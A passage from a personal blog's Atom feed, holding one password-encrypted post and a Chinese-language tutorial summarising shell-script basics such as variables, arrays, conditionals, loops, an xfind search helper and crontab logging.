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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
</feed>
